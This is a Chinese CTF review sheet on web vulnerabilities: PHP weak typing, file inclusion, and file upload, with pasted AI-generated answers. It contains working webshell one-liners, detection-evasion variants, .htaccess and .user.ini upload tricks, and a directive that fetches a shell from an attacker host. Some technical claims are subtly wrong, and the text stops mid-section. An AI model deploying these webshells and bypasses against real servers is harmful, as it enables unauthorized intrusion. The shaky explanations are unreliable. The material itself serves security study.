### 该文本提供ctf复习题（主要是web）
- 该文本作用
    - 复习参考
    - 指明知识区块
----

#### web ctf基础知识
- <?= ?>里面能包含几条语句？
- <?php var_dump(function_exists('system')); ?>有什么用，都能检测什么？
- 如果url参数里要出现类似于"test'test"test"test'test"，为了避免引号过早闭合，最好的解决方法是什么？
<details>
<summary>修正pyload：
```php
<?php
system('echo "<?= eval(system("$_POST['cmd']"))" > evil.php')
?>
```
</summary>

在处理你给出的这段代码时，我们需要从**技术实现**和**安全性**两个维度来分析。

### 1. 关于“不用百分号编码，能用转义吗？”

在 URL 参数中，**不能**用斜杠（如 `\"`）来替代百分号编码。

* **原因**：URL 标准协议（RFC 3986）并不识别 `\` 作为转义符。如果你在 URL 中发送 `?cmd=\"`，服务器接收到的字面值就是 `\` 和 `"`。
* **后果**：由于引号在 HTML 属性或 URL 结构中具有特殊含义，不使用 `urlencode` 极易导致参数被截断或引发安全漏洞。

---

### 2. 对你提供的代码片段分析

你给出的代码是一个典型的**后门植入（Webshell）**逻辑。这段代码在语法和逻辑上存在几个严重问题，直接运行会导致解析错误：

```php
// 原始代码
system('echo "<?= eval(system("$_POST['cmd']"))" > evil.php')

```

#### 这里的三个主要问题：

1. **引号嵌套冲突**：你在 `echo` 的双引号内部又使用了双引号 `system("...")`，这会导致 PHP 解析器提前结束字符串。
2. **变量解析**：在双引号内，PHP 会尝试解析 `$_POST['cmd']`。由于此时是在执行写文件操作，这会导致变量在写入文件前就被解析（通常为空），而不是把字面量写入文件。
3. **数组引号**：`$_POST['cmd']` 在双引号字符串内部时，`cmd` 的单引号会引发语法错误。

---

### 3. 正确的转义/写法示例

如果你想通过 PHP 脚本生成另一个包含 `eval` 的 PHP 文件，你应该使用**单引号**来包裹外层，以防止变量被即时解析，并使用特定的转义方式：

#### 修正后的代码（用于写入文件）：

```php
<?php
// 使用单引号包裹，防止内部的 $ 被 PHP 解析
// 使用 . 拼接或特定的转义来处理内部引号
$code = '<?php eval(system($_POST["cmd"])); ?>';
system("echo '" . $code . "' > evil.php");
?>

```

---

### 4. ⚠ 重要安全警告

你提供的代码模式属于 **远程代码执行 (RCE)** 漏洞的利用方式。

* **非法用途**：未经授权在他人服务器上植入此类代码属于违法行为。
* **防御建议**：作为开发者，你应该始终禁用 `eval()`、`system()`、`exec()` 等危险函数，或者通过 `php.ini` 中的 `disable_functions` 进行限制。
* **代码审计**：永远不要直接将用户输入（如 `$_POST`）不经过滤就传递给系统命令或执行函数。

**你想了解如何通过配置 php.ini 或使用 Web 应用防火墙（WAF）来拦截这种恶意的 `eval` 植入攻击吗？**

这是一个关于 PHP 字符串拼接与 Shell 命令执行机制的问题。我们拆解开来看，这涉及到了 PHP 语法和操作系统命令行（Shell）的双重逻辑。

### 1. `system` 内部必须带有 `""` 吗？

**不一定。** `system()` 函数需要的参数是一个**字符串**。

在 PHP 中，你可以用双引号 `""`、单引号 `''` 甚至变量来传递这个字符串。
<br>
但是如果没有引号，php可能会去尝试解析该语句从而导致错误。

* **使用变量**：`system($command);`（这是最常用的）。
* **使用单引号**：`system('ls -la');`。
* **使用双引号**：`system("ls -la");`。

**区别在于：** 如果你需要在字符串里直接解析 PHP 变量，就必须用双引号。如果你只是传递一个纯粹的命令，单引号更安全、性能更好。

---

### 2. 为什么 `$code` 两边有 `.` 和 `"` ？

在你看到的这行代码中：
`system("echo '" . $code . "' > evil.php");`

这其实是 **PHP 的字符串拼接操作**。

#### 拆解分析：

这段代码由三部分组成，通过点号 `.` 连接：

1. **`"echo '"`**：第一个字符串片段。
2. **`. $code .`**：中间插入变量 `$code` 的内容。
3. **`"' > evil.php"`**：最后一个字符串片段。

#### 为什么要加那两个单引号 `'` ？

这是为了给 **Shell（操作系统）** 看的。

* 当你执行 `echo` 时，如果内容里包含空格或特殊字符（比如 `<?php ... ?>`），Shell 会误以为命令结束了。
* 为了让 Shell 把 `$code` 里的全部内容当做一个整体处理，必须用引号把它包裹起来。

---

### 3. 这里的逻辑陷阱

如果你写成这样（不用拼接）：
`system("echo $code > evil.php");`

虽然在 PHP 里可行，但如果 `$code` 的内容是 `<?php ... ?>`，发送到 Shell 后，Shell 可能会因为看到 `>` 或 `;` 等特殊符号而产生歧义，导致写入文件失败或产生不可预料的报错。

#### 举例说明拼接后的最终结果：

假设 `$code` 的值是 `hello`，那么拼接后交给 `system` 执行的完整字符串就是：
`echo 'hello' > evil.php`

---

### 4. 更好的替代方案：`file_put_contents`

在 PHP 中，如果你想把一段代码写入文件，**强烈建议不要使用 `system("echo ...")**`。

* **原因 1（安全）**：`system` 会调用系统 Shell，极易被命令注入攻击。
* **原因 2（跨平台）**：`echo` 命令在 Windows 和 Linux 上的表现可能不同。
* **原因 3（性能）**：调用系统进程非常消耗资源。

**推荐写法：**

```php
<?php
$code = '<?php eval($_POST["cmd"]); ?>';
file_put_contents('evil.php', $code);
?>

```

这种方式不需要考虑 Shell 转义，不需要考虑引号嵌套，既安全又高效。

**你想深入了解一下 PHP 字符串中单引号和双引号在处理转义字符（如 `\n`, `\t`, `\$`）时的具体区别吗？**
</details>
- index.php是做什么的？
- 如果把index.php删掉了会怎样？
- index.php只能叫index.php吗？
- 网站的每个目录都含有一个index.php吗？
- 传统CMS中为什么建议每个目录下都有一个index.php？
- 如果传统CMS目录中没有index.php,可能会发生什么？
- 现代框架中index.php如何处理不访问根目录的url？
- 什么是序列化和反序列化？
- 常见文件名后缀在dirsearch中的使用:dirsearch.py -u http://target.com/ -e php,phps(这东西太复古了，攻防世界NO.GFSJ0235那道题用dirsearch扫不出来),bak,zip,txt
<details>
<summary> 协议和伪协议 </summary>

- 有些php环境配置下伪协议不区分大小写，可以用Php://来绕过关于php://的过滤

-----

#### 经典php
<details>
<summary>首先请看题</summary>

```php
<?php
highlight_file(__FILE__);
$key1 = 0;
$key2 = 0;

$a = $_GET['a'];
$b = $_GET['b'];

if(isset($a) && intval($a) > 6000000 && strlen($a) <= 3){
    if(isset($b) && '8b184b' === substr(md5($b),-6,6)){
        $key1 = 1;
        }else{
            die("Emmm...再想想");
        }
    }else{
    die("Emmm...");
}

$c=(array)json_decode(@$_GET['c']);
if(is_array($c) && !is_numeric(@$c["m"]) && $c["m"] > 2022){
    if(is_array(@$c["n"]) && count($c["n"]) == 2 && is_array($c["n"][0])){
        $d = array_search("DGGJ", $c["n"]);
        $d === false?die("no..."):NULL;
        foreach($c["n"] as $key=>$val){
            $val==="DGGJ"?die("no......"):NULL;
        }
        $key2 = 1;
    }else{
        die("no hack");
    }
}else{
    die("no");
}

if($key1 && $key2){
    include "Hgfks.php";
    echo "You're right"."\n";
    echo $flag;
}

?> Emmm...
```
<details>
<summary>if(isset($a) && intval($a) > 6000000 && strlen($a) <= 3)这个怎么绕过？</summary>

这行代码是一个经典的 PHP CTF 逻辑绕过题。要绕过它，我们需要同时满足三个矛盾的条件：

1. `isset($a)`: 变量  必须存在。
2. `intval($a) > 6000000`:  的整数值必须大于 600 万。
3. `strlen($a) <= 3`:  的字符串长度不能超过 3 个字符。

看上去 6,000,001 至少有 7 位，远超 3 位的限制，但 PHP 的弱类型特性和科学计数法可以帮我们解决这个问题。

---

### 绕过方案：使用科学计数法

在 PHP 中，`intval()` 函数在处理字符串时，会识别科学计数法（E 表示法）。

**推荐 Payload:**
`$a = "9e8"`

### 为什么这个能行？

* **长度检查：** `"9e8"` 只有 3 个字符（'9', 'e', '8'），满足 `strlen($a) <= 3`。
* **数值检查：** 当 `intval("9e8")` 执行时，PHP 会将其解析为 ，即 **900,000,000**。
* **对比结果：** 9 亿显然大于 600 万，满足 `intval($a) > 6000000`。

---

### 其他可能的变体

如果环境中对字符有限制，你也可以尝试其他底数或指数，只要保持长度在 3 以内：

* `"1e7"` ()
* `"7e6"` ()

### 关键原理说明

| 函数 | 对 "9e8" 的处理 | 结果 |
| --- | --- | --- |
| **strlen()** | 计算原始字符串字符个数 | 3 |
| **intval()** | 将字符串转为整数（支持科学计数法） | 900000000 |

> **注意：** 这种绕过方式通常出现在 PHP 7.0 以下或特定的 `intval` 处理逻辑中。在某些严谨的强类型校验下，这种方法可能会失效，但在大多数 CTF 题目中这是标准解法。

你想了解如何针对这类漏洞进行代码审计和防御修复吗？
</details>

<details>
<summary> if(isset($b) && '8b184b' === substr(md5($b),-6,6))又怎么绕过？</summary>

这是一个典型的 **MD5 截断哈希爆破**问题。

代码的要求是：你输入的变量 `$b`，其 MD5 加密后的字符串的 **最后 6 位字符** 必须等于 `8b184b`。

由于 MD5 是不可逆的，且这里使用了全等号 `===`（不存在弱类型绕过），**唯一的绕过方式就是“爆破”（Brute Force）**。

---

### 1. 绕过思路

你需要写一个简单的脚本，不断尝试不同的输入（通常是数字或字母组合），计算它们的 MD5 值，直到找到一个以 `8b184b` 结尾的值。

### 2. Python 爆破脚本

这是一个高效的 Python 脚本，可以帮你快速找到符合条件的 `$b`：

```python
import hashlib

target = '8b184b'

# 尝试从 1 开始爆破到 10,000,000
for i in range(10000000):
    b = str(i)
    md5_hash = hashlib.md5(b.encode()).hexdigest()
    
    # 获取最后 6 位进行比对
    if md5_hash[-6:] == target:
        print(f"找到匹配! 输入值 $b 应该是: {b}")
        print(f"对应的 MD5 值: {md5_hash}")
        break

```

### 3. 为什么不能直接“算”出来？

MD5 是一种抗碰撞的哈希函数。

* **不可逆性：** 你不能通过 `8b184b` 反向推导出原始字符串。
* **雪崩效应：** 原始数据的微小改变都会导致哈希值巨大的变化。

因此，这类题目考察的是你**编写自动化脚本的能力**。

---

### 4. 常见的 CTF 变体

* **前缀匹配：** `substr(md5($b), 0, 6) === '123456'`（匹配前 6 位）。
* **特定字符：** `md5($b) == '0e123...'`（这是 PHP 弱类型绕过，只要找到一个 MD5 结果以 `0e` 开头且后面全为数字的字符串即可）。

**你可以直接尝试运行上面的脚本，通常在几秒钟内就能得到结果。需要我帮你直接跑出这个 `8b184b` 对应的数字吗？**
</details>

<details>
<summary>if(is_array($c) && !is_numeric(@$c["m"]) && $c["m"] > 2022)这个怎么绕过</summary>

这是一个包含多个条件的安全检查，让我分析如何绕过：

## 条件分析
```php
if(is_array($c) && !is_numeric(@$c["m"]) && $c["m"] > 2022)
```
三个条件必须**同时满足**：
1. `is_array($c)` - $c必须是数组
2. `!is_numeric(@$c["m"])` - $c["m"]必须**不是**数字
3. `$c["m"] > 2022` - $c["m"]必须大于2022

## 矛盾点分析
这里有个明显矛盾：
- 条件2要求 `$c["m"]` **不是数字**
- 条件3要求 `$c["m"]` **能进行数值比较且大于2022**

## PHP的弱类型比较特性

### 绕过方法1：使用数值字符串
```php
// JSON输入示例
$c = '{"m":"2023a"}';
// 或
$c = '{"m":" 2023"}';
// 或
$c = '{"m":"2023 "}';
```

**原理**：
- `is_numeric("2023a")` 返回 `false`（因为包含非数字字符）
- 但 `"2023a" > 2022` 在比较时会自动类型转换：
  - PHP会将字符串转换为数字（取前导数字部分）
  - `"2023a"` → `2023`（类型转换）
  - `2023 > 2022` → `true`

### 绕过方法2：使用科学计数法字符串
```php
$c = '{"m":"2e3"}';  // 2e3 = 2000
$c = '{"m":"2.023e3"}';  // 2023
```

**原理**：
- `is_numeric("2e3")` 返回 `false`
- `"2e3" > 2022` → `2000 > 2022` → `false`（不符合）
- 需要大于2022，所以用 `"2.023e3"`（2023）

### 绕过方法3：使用前导/尾随空格的数字字符串
```php
$c = '{"m":"2023 "}';    // 尾部空格
$c = '{"m":" 2023"}';    // 前导空格
$c = '{"m":"\t2023"}';   // 制表符
```

### 绕过方法4：使用特殊字符的数字字符串
```php
$c = '{"m":"2023\n"}';   // 换行符
$c = '{"m":"2023\r"}';   // 回车符
$c = '{"m":"+2023"}';    // 正号（is_numeric返回true，不能用）
$c = '{"m":"-2023"}';    // 负号（数值不够大）
```

## 测试示例

```php
// 假设通过JSON传入
$test_cases = [
    '{"m":"2023a"}',     // ✓ 通过
    '{"m":"2023 "}',     // ✓ 通过
    '{"m":"2.023e3"}',   // ✓ 通过
    '{"m":"2023\n"}',    // ✓ 通过
    '{"m":"9999xxx"}',   // ✓ 通过
];

foreach ($test_cases as $json) {
    $c = (array)json_decode($json);
    
    $cond1 = is_array($c);
    $cond2 = !is_numeric(@$c["m"]);
    $cond3 = @$c["m"] > 2022;
    
    echo "输入: $json\n";
    echo "数组: " . ($cond1 ? '是' : '否') . "\n";
    echo "非数字: " . ($cond2 ? '是' : '否') . "\n";
    echo "大于2022: " . ($cond3 ? '是' : '否') . "\n";
    echo "总结果: " . ($cond1 && $cond2 && $cond3 ? '通过' : '失败') . "\n\n";
}
```

## 最有效的绕过方法

```php
// 最可靠的payload
$payload = '{"m":"2023a"}';

// 或者
$payload = '{"m":"2023 "}';

// 或者使用非常大的数字
$payload = '{"m":"9999999999999999999999abc"}';
// is_numeric()返回false，但比较时会变成INF（无穷大）
```

## 修复建议

这种安全检查应该改为：
```php
// 正确的方式
if(is_array($c) && isset($c["m"])) {
    $m = $c["m"];
    
    // 严格类型检查
    if(is_int($m) && $m > 2022) {
        // 安全逻辑
    }
    
    // 或者先转为整数再比较
    $m_int = (int)$m;
    if($m_int > 2022 && (string)$m_int === (string)$m) {
        // 确保转换前后一致
    }
}
```

**关键问题**：PHP的弱类型比较导致了安全漏洞，应该使用`===`严格比较或进行类型验证。
</details>

<details>
<summary>$d = array_search("DGGJ", $c["n"]);怎么绕过</summary>

- 其实该点利用了php弱类型的一个知识点，***如果字符串开头没有数字，则默认是0***
- 又由于array_search用的是弱类型<br>
所以我们直接让c["n"]的值包含0即可
</details>
</details>

-----
#### 文件包含漏洞
- file协议(file://)是做什么的，通常怎么用
- php://input和data://都有什么用，怎么用？
<details>
<summary>data://协议例题摘要</summary>

```php

WRONG WAY! <?php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET["file1"]) && isset($_GET["file2"]))
{
    $file1 = $_GET["file1"];
    $file2 = $_GET["file2"];
    if(!empty($file1) && !empty($file2))
    {
        if(file_get_contents($file2) === "hello ctf")
        {
            include($file1);
        }
    }
    else
        die("NONONO");
}
```
<br>
<details>
<summary>
该题原本构造了payload:file1=php://filter/read=convert.base64-encode/resource=flag.php&file2="hello ctf"但无法使用，原因是？
</summary>

你提供的 Payload 无法执行，主要原因在于对 `file2` 的处理方式上。`file_get_contents($file2)` 会尝试读取一个**文件**或**URL**的内容，而你直接传入了字符串 `"hello ctf"`，PHP 会把它当作一个文件名去寻找，显然找不到这个文件。

以下是详细的代码逻辑分析和解决方案：

### 1. 为什么你的 Payload 失败了？

* **`file2` 的错误：** 当你设置 `file2="hello ctf"` 时，代码执行 `file_get_contents("hello ctf")`。因为服务器上不存在名为 `"hello ctf"` 的文件，函数会返回空或报错，自然不等于 `"hello ctf"`。
* **`file1` 的语法：** 你的 `file1` 后面跟了一个逗号，这在 URL 参数中是不正确的。参数之间应该使用 `&` 分隔。

---

### 2. 正确的解决思路：PHP 伪协议

要绕过 `file_get_contents($file2) === "hello ctf"`，最常用的方法是使用 **`php://input`** 或 **`data://`** 协议。

#### 方法 A：使用 `data://` 协议（最推荐）

`data://` 协议可以将输入流直接当作文件内容读取。

* **Payload:**
`?file1=php://filter/read=convert.base64-encode/resource=flag.php&file2=data://text/plain,hello ctf`

#### 方法 B：使用 `php://input`

`php://input` 可以读取 POST 请求中的原始数据。

* **URL 参数:** `?file1=php://filter/read=convert.base64-encode/resource=flag.php&file2=php://input`
* **POST 正文 (Body):** `hello ctf`

---

### 3. 完整的操作步骤

1. **构建 URL：**
使用 `data://` 协议最为方便，因为它只需要一个 GET 请求：
```text
http://61.147.171.103:54210/?file1=php://filter/read=convert.base64-encode/resource=flag.php&file2=data://text/plain,hello%20ctf

```


*(注意：`hello ctf` 中间的空格在 URL 中会自动变成 `%20`)*
2. **获取 Base64 字符串：**
执行后，页面会返回一串 Base64 编码的字符。
3. **解码：**
将这串字符进行 Base64 解码，即可看到 `flag.php` 的源代码，里面就藏着 Flag。

---

### 关键点总结表格

| 组件 | 作用 | 你的错误点 |
| --- | --- | --- |
| **file1** | 用于包含并读取文件 | 后面不该用逗号，且建议加上 `resource=` 前缀 |
| **file2** | 必须让 `file_get_contents` 返回指定字符串 | 不能直接写字符串，必须使用协议（如 `data://`） |
| **Separator** | 连接多个参数 | 必须使用 `&` 而不是 `,` |

你想让我帮你生成一个可以直接在浏览器或 Burp Suite 中使用的完整攻击链接吗？
</details>
</details>
</details>

- 常用的请求头字段有哪些？
- X-Forwarded-For: 是做什么的？
- Referer: 是做什么的？
------
#### 文件上传漏洞知识点

<details>
  <summary>文件上传必须是什么请求方式（三种，一种最常用）？</summary>

  1. **POST**（最常用，通常配合 `multipart/form-data`）
  2. **PUT**（某些 WebDAV 配置或 API 场景）
  3. **PATCH**（用于断点续传等特殊场景）
</details>

<details>
  <summary>文件上传成功的核心点是什么（http请求头的某个条目）？</summary>

  核心点是 **`Content-Type`**。
  在文件上传请求中，该条目必须指定为 `multipart/form-data`，并包含一个 `boundary` 字符串，用于分隔表单中的不同字段和文件数据。
</details>

<details>
  <summary>表单中需要

```
<input type="file" name="upload">
```
是什么意思？</summary>
  
  这个东西会生成一个选择框，用来选择文件（点击选择文件）。
  如果看到了有这个html行，就说明很可能存在文件上传点，此时可以考虑文件上传漏洞。
</details>

<details>
  <summary>一个能够成功上传文件的HTML表单必须满足哪三个元素？</summary>

  方法必须是 POST：method="POST"（正如你笔记中前两条提到的）。
  必须有文件输入框：即 <input type="file" name="...">。
  必须声明编码类型（最重要）：表单标签必须加上 enctype="multipart/form-data"。
</details>

<details>
  <summary>什么是一句话木马？</summary>
  
  形式如<?php eval($_POST['a']) ?>
  其中eval就是执行命令的函数，**$_POST[‘a’]**就是接收的数据。eval函数把接收的数据当作PHP代码来执行。这样我们就能够让插入了一句话木马的网站执行我们传递过去的任意PHP语句。
</details>

- php,asp,aspx各是什么，它们的一句话木马又是什么？
- 一句话木马整套攻击流程？
- 一句话木马的原理？
- 很强的免杀一句话木马：
```php
<?php
$func = create_function('', $_POST['cmd']);
$func();
?>
```
可用antsword直接连接
<details>
<summary> 服务器不允许上传php文件怎么办？</summary>
参考攻防世界web简单题easyupload一题
<br>
<br>
查看js,看看是不是js限制了文件类型和内容，是的话禁用js即可。
    <details>
    <summary>有时候后端对文本内容进行过滤，绕过方法有？</summary>
    看来你遇到了一个典型的 **WAF（Web 应用防火墙）** 或 **后端安全校验**。从你的描述来看，这道题设置了多重关卡。

当系统提示“文件看起来是邪恶的”时，通常意味着它不仅检查**后缀名**，还在检查**文件内容**（Content Inspection）或 **MIME 类型**。

以下是绕过这类限制的几个常见思路，你可以按顺序尝试：

---

### 1. 内容绕过：避开敏感函数

系统提示“邪恶”，极大概率是因为检测到了 `eval`、`system`、`assert` 等 PHP 关键字。

* **利用字符串拼接：**
```php
<?php $a = "ev"."al"; $a($_POST['x']); ?>

```


* **利用 `$_GET` 传参绕过检测：**
```php
<?php $_GET['a']($_POST['x']); ?>
// 访问时使用：file.php?a=eval，然后 POST 传递 x=phpinfo();

```


* **使用短标签（如果环境支持）：**
```php
<?= `$_GET[x]`; ?>  // 使用反引号执行系统命令

```



### 2. MIME 类型绕过 (Content-Type)

即便你修改了后缀名为 `.img`，抓包工具（如 Burp Suite）显示的 `Content-Type` 可能依然是 `text/plain` 或 `application/octet-stream`。

* **操作：** 在上传时使用 Burp Suite 拦截请求，将 `Content-Type` 手动修改为图片格式：
`Content-Type: image/jpeg` 或 `image/png`。

### 3. 文件头检查 (File Header/Magic Bytes)

有些后端会检查文件的前几个字节来判断文件类型。如果不是合法的图片头，就会报错。

* **绕过方法：** 在木马代码的最前面添加图片的幻数（Magic Bytes）。
* **GIF89a** 是最常用的，因为它简单且是纯文本：


```php
GIF89a
<?php eval($_POST['x']); ?>

```



### 4. 后缀名黑名单/白名单

既然 `txt` 和 `img` 都被拦截，你需要确认后端到底允许什么后缀。

* **尝试黑名单绕过：** 如果后端只禁止了 `.php`，可以尝试 `.php3`, `.php5`, `.phtml`, `.phps`。
* **尝试后缀截断/重叠：** 例如 `shell.php.jpg` 或者 `shell.pphphp`（如果后端执行一次性替换）。
* **配合 .htaccess 或 .user.ini：**
如果能上传 `.htaccess`（Apache）或 `.user.ini`（Nginx/PHP），可以强制让服务器将图片文件当作 PHP 执行。

---

### 建议操作步骤

1. **先测试纯文本：** 上传一个内容只有 `123` 的 `test.jpg`，看是否报错。如果不报错，说明你的代码内容被特征库匹配了。
2. **加入图片头：** 在木马前加上 `GIF89a`。
3. **编码绕过：** 使用 Base64 编码你的代码，然后在 PHP 中解码执行，避开 `eval` 关键字的直接扫描：
```php
<?php $c=base64_decode("ZXZhbCgkX1BPU1RbJ3gnXSk7"); @$c; ?>

```



**你想让我帮你写一个更隐蔽的免杀木马脚本，还是想针对具体的 WAF 过滤逻辑进行分析？**
        <details>
        <summary>对于针对<?php eval($_POST['a']) ?>中php等字样进行过滤的</summary>
        这就是 CTF 中最经典的“关键字黑名单”过滤，通常被戏称为“无字母数字 WebShell”挑战的前奏。既然 `php` 这个词本身被禁了，正常的 `<?php` 标签就会失效。

你可以尝试以下几种进阶的绕过姿势，它们专门对付那种“看到 `php` 就报错”的 WAF：

---

### 1. 使用短标签 (Short Tags)

如果服务器配置（`short_open_tag = On`）允许，你可以完全避开 `php` 这三个字母：

* **标准短标签：**
`<?  eval($_POST['x']); ?>`
* **短标签输出（最常用）：**
`<?= (自定义函数或命令) ?>`
例如执行系统命令：`<?= `ls /`; ?>` 或者 `<?= system('cat /flag'); ?>`

### 2. 这里的 `php` 是指内容还是后缀？

如果后缀也不能带 `php`，而你已经能上传文件了，可以利用配置文件改变解析规则：

* **上传 `.htaccess` (Apache 专用):**
如果目标是 Apache 环境，先上传一个名为 `.htaccess` 的文件，内容如下：
```apache
AddType application/x-httpd-php .jpg

```


这会告诉服务器：**“把所有 .jpg 文件当做 PHP 脚本来执行”**。之后你上传包含木马的 `shell.jpg` 就能成功解析。
* **上传 `.user.ini` (Nginx/PHP-FPM 专用):**
如果目录下有已存在的 PHP 文件（比如 `index.php`），你可以上传 `.user.ini`：
```ini
auto_prepend_file=shell.jpg

```


这会让 `index.php` 在执行前自动包含你的 `shell.jpg` 内容。

### 3. 终极手段：无字母数字绕过 (None-Alphanumeric)

如果它过滤得非常狠（比如连 `eval`, `system` 也禁了），你需要构造一个“看起来全是乱码”的木马。

* **异或 (XOR) 绕过：** 利用两个特殊字符串进行异或运算，生成你需要的字符。
* **取反 (Bitwise Not) 绕过：**
利用 PHP 中字符串取反的特性：`(~%8F%97%8F%96%91%90)();` 这种形式在代码审计中极难被静态规则发现。

---

### 接下来该怎么做？

你需要先确认两件事：

1. **容器环境：** 是 Apache 还是 Nginx？（决定了是用 `.htaccess` 还是 `.user.ini`）
2. **过滤强度：** 仅仅是禁了 `php` 字符串，还是连 `(` `)` `[` `]` 这种符号也禁了？

**如果你想继续挑战，可以告诉我后端报错的具体环境（或者是题目的平台名称），我可以帮你写一段针对性的“免杀”Payload 试试看？**

这是一个非常敏锐的观察！在理想的安全架构中，确实应该将**上传目录**与**执行环境**完全隔离，但在 CTF 题目和许多现实中的中小型网站配置中，这种隔离往往并不严密。

这里有几个核心原因，解释了为什么 `.htaccess` 能够成为文件上传漏洞中的“神兵利器”：

### 1. 局部作用域的“权限下放”

Apache 设计 `.htaccess` 的初衷是为了让用户（特别是那些没有服务器主配置文件 `httpd.conf` 修改权限的虚拟主机用户）能够**按目录**自定义配置。

* **生效机制**：当 Apache 处理一个请求时，它会从当前请求的目录开始，一直向上级目录寻找 `.htaccess` 文件。如果找到了，里面的配置就会**覆盖**全局配置。
* **默认开启**：只要全局配置文件中对该目录设置了 `AllowOverride All`，`.htaccess` 就会生效。很多一键安装包（如旧版 XAMPP/phpStudy）默认就是开启的。

---

### 2. “目录隔离”与“解析逻辑”的矛盾

你提到的“目录分隔”通常有两种理解，但它们在 Apache 默认逻辑下都有漏洞：

* **物理路径隔离**：即便你把文件上传到了 `/var/www/html/uploads/`，只要这个目录在 Apache 的 `DocumentRoot`（网站根目录）之下，且该目录没有被配置为 `php_admin_flag engine off`（禁用 PHP 引擎），它就具备执行脚本的潜力。
* **权限限制失效**：如果上传目录没有禁止 `.htaccess` 的解析，攻击者上传的 `.htaccess` 就会重写该目录的 **MIME 映射表**。

> **举个例子：**
> 正常情况下，服务器看到 `.jpg` 结尾的文件，会直接丢给浏览器渲染。但你在上传目录放了 `.htaccess` 说：“在这个文件夹里，所有 `.jpg` 都要交给 PHP 解释器处理。” 那么服务器就会乖乖听话。

---

### 3. CTF 题目的特意设计

在真实的生产环境中，高水平的运维会采取以下措施：

1. **全局禁用**：在 `httpd.conf` 中设置 `AllowOverride None`，直接无视 `.htaccess`。
2. **写执行分离**：上传目录设置“只写不可执行”权限，或者通过 Web 服务器配置禁止解析该目录下的任何脚本。
3. **异地存储**：将上传的文件存放在对象存储（如阿里云 OSS）或完全独立的静态资源服务器上，那里根本没有 PHP 解释器。

**但在 CTF 中**，为了考察你对 Web 服务器解析特性的理解，题目通常会故意留下 `AllowOverride All` 这个缺口。

---

### 4. 常见的 .htaccess 攻击 Payload

除了你之前看到的改后缀，`.htaccess` 还能玩出很多花样：

* **设置解析特定文件：**
```apache
<FilesMatch "my_secret_file">
  SetHandler application/x-httpd-php
</FilesMatch>

```


（这会让一个叫 `my_secret_file` 的文件即便没有后缀也能被当做 PHP 执行）
* **包含远程文件（需开启 allow_url_include）：**
```apache
php_value auto_prepend_file "http://attacker.com/shell.txt"

```



### 总结

`.htaccess` 就像是目录里的“土皇帝”，只要主配置文件给了它“自治权”，它就能更改该目录下的所有规则。

**你想试试看在你的环境里通过 `.htaccess` 配合一个普通的 `.png` 图片来获取 `phpinfo()` 吗？我们可以写一个最简化的实验流程。**
        </details>
  
</details>
</details>

- 什么是.user.ini (php)，为什么它在文件上传漏洞中扮演着重要角色？
- 为什么.user.ini和.htaccess这种配置文件尽管有专门的存放地点，但还是能在ctf题的上传文件目录中被使用？
- .htaccess和.user.ini的区别（在哪一层，分别影响什么）？
- .htaccess和.user.ini在两类环境中的扫描模式分别是什么样的？
- .htaccess和.user.ini的使用条件是？
- .user.ini不及时生效的原因有？
- 什么叫.user.ini的寄生特性？
- php.ini的几种模式有哪些，对于.user.ini都有什么用，对文件上传漏洞都有什么用？
- 在哪配置php模式，php.ini什么时候发挥作用，在哪发挥作用，怎么控制(从根本的配置到发挥作用的示例过程来讲)？
- .user.ini对于php版本的要求是？
- 什么叫做“魔数”？
- “魔数”能够骗过linux的file命令吗？
- 为什么魔数能够生效，这是不是说明纯文本没有文件头？
- 为什么要用printf来输入魔数，而不能用文本编辑器？
- 如何有效查找自己上传的文件的位置（提示：bp流量）？
- 为什么.user.ini的文件头写上GIF89a后语句仍然能够生效？
<details>
<summary>如何欺骗服务器使其误判上传的文件的类型？</summary>
提示:<br>
修改后缀<br>
修改文件头部信息<br>
谎报文件MIME类型<br>
若限制了文件后缀名（黑名单）: <br>
大小写绕过：尝试 .pHp, .AsP（适用于对大小写不敏感的 Windows 服务器）。<br>
别名绕过：使用服务器支持的其他扩展名。例如 PHP 可能会解析 .php3, .php4, .phtml, .pht。<br>
双后缀名：例如 shell.jpg.php。如果服务器从左向右解析，可能只看到 .jpg。<br>
空字节截断 (Null Byte Injection)：<br>
构造：shell.php%00.jpg<br>
原理：在一些旧版本的编程语言（如 PHP 5.3 之前）中，底层 C 语言处理文件名时遇到 %00（十六进制 0x00）会认为字符串已结束，从而将文件保存为 shell.php，而逻辑校验层看到的则是 .jpg。<br>
Apache 解析漏洞：Apache 默认从右向左识别后缀。如果遇到不认识的后缀（如 .qwer），它会继续向左看。构造 shell.php.qwer 可能被识别为 PHP。<br>
Nginx 解析漏洞：在某些配置下，访问 test.jpg/x.php 会导致 Nginx 将 test.jpg 当作 PHP 脚本执行。<br>
IIS 解析漏洞：例如分号截断 image.asp;.jpg，IIS 6.0 会将其解析为 asp 文件。<br>
图片马 (Image Polyglot)<br>
这是最高级的欺骗方式：将恶意代码真正地嵌入到合法的二进制图片数据中。<br>
操作方法：使用 copy /b image.jpg + shell.php webshell.jpg 命令将脚本合并到图片尾部，或者利用 EXIF 信息（如标题、版权字段）插入代码。<br>
目的：确保文件既能通过后端严格的图形库（如 GD 库）的渲染检查，又能通过后缀修改或解析漏洞在服务器上运行。<br>
</details></details>

-----
#### php读取不被希望读取的内容
- php://filter是干嘛的？
- 为什么需要用php://filter来输出php脚本内容，不能直接让网页直接处理输出php脚本内容？
- php高危函数：include,require分别有什么特性，如何利用？
- include一定会把包含的文件当成php代码执行吗？
- include("php://filter/read=convert.base64-encode/resource=flag.php")为什么能用？
<details>
<summary>解释以下代码和相关问题</summary>

```php
    $lan = $_COOKIE['language'];
    @include($lan.".php")
```
- $lan的内容是被引号包裹的吗？
- include是把引号内的代码当作php执行了吗？
- 该例子体现了php://filter的什么用途？
</details>

-----
#### 文件上传/包含漏洞常见误区/用法
<details>
<summary>关于include等函数的误区</summary>

- include,require等函数本质上是要去读取一个文件的（需要切实有文件）
- php://filter看着像是传了个文本，实际上是把文件位置也给传了，所以能用
- data://，php://input虽然没有创建新文件，但是其实际上其被处理为文件流，有文件的特征
- file://同php://filter
- data://和php://filter并不是一直能用的，其需要"allow_url_include=On"
- data://和php://filter在include中可能不产生任何报错，如果啥输出没有，可能就要换方法了

</details>

<details>
<summary>文件上传/包含漏洞的协议/伪协议的常见用法</summary>

在CTF比赛中，文件包含（File Inclusion）和文件上传（File Upload）往往是获取权限（RCE）的核心入口。利用PHP伪协议（Wrappers）和各种编码技巧是绕过安全检测的必备手段。

以下是针对CTF场景整理的超详细手册：

---

## 一、 PHP 伪协议深度利用

